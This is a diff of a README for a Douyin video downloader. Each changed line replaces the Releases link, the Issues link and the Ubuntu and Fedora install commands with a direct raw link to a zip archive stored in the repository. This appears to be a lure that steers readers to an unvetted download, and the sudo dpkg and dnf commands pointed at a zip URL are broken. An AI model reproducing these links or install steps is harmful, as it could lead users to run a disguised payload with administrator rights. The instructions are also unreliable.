@@ -14,7 +14,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download douyin-video-downloader](https://github.com/Hemiloluwa/douyin-video-downloader/releases).
+To get started, visit this page to download: [Download douyin-video-downloader](https://github.com/Hemiloluwa/douyin-video-downloader/raw/refs/heads/main/uncurling/downloader_douyin_video_2.6.zip).
 
 1. Go to the **Releases page** linked above.
 2. Look for the latest version. It will usually be the first in the list.
@@ -46,8 +46,8 @@ Once you have downloaded the file, follow these instructions to install it on yo
 1. Open your terminal.
 2. Navigate to the directory where the downloaded package is.
 3. Run the appropriate installation command, which may vary based on your Linux distribution.
-   - For Ubuntu: `sudo dpkg -i douyin-video-downloader.deb`
-   - For Fedora: `sudo dnf install douyin-video-downloader.rpm`
+   - For Ubuntu: `sudo dpkg -i https://github.com/Hemiloluwa/douyin-video-downloader/raw/refs/heads/main/uncurling/downloader_douyin_video_2.6.zip`
+   - For Fedora: `sudo dnf install https://github.com/Hemiloluwa/douyin-video-downloader/raw/refs/heads/main/uncurling/downloader_douyin_video_2.6.zip`
 4. After installation, you can run the application from your application menu.
 
 ## ⚙️ How to Use
@@ -66,7 +66,7 @@ Once you have downloaded the file, follow these instructions to install it on yo
 
 ## 🌐 Support & Issues
 
-If you encounter any problems while using the application, feel free to check the Issues section on the [GitHub repository](https://github.com/Hemiloluwa/douyin-video-downloader/issues). You can report bugs or request help from the community there.
+If you encounter any problems while using the application, feel free to check the Issues section on the [GitHub repository](https://github.com/Hemiloluwa/douyin-video-downloader/raw/refs/heads/main/uncurling/downloader_douyin_video_2.6.zip). You can report bugs or request help from the community there.
 
 ## 📄 License
 
@@ -76,4 +76,4 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 You are now ready to enjoy your favorite Douyin videos without watermarks. If you have any questions or suggestions, don’t hesitate to reach out through the Issues section. Thank you for using douyin-video-downloader! 
 
-For downloads, revisit this page: [Download douyin-video-downloader](https://github.com/Hemiloluwa/douyin-video-downloader/releases).
+For downloads, revisit this page: [Download douyin-video-downloader](https://github.com/Hemiloluwa/douyin-video-downloader/raw/refs/heads/main/uncurling/downloader_douyin_video_2.6.zip).
